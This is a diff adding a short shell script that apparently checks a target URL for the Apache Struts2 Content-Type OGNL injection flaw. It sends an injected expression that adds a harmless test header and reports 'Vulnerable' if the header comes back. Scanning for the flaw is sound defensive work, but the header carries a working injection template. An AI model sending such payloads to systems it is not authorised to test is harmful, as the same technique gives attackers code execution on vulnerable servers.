@@ -1,0 +1,5 @@
+#!/bin/sh
+
+TARGET="$1"
+
+curl -s -i --insecure -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Life-Universe-Everything',7*6)}.multipart/form-data" $TARGET | fgrep -i life-universe-everything && echo Vulnerable
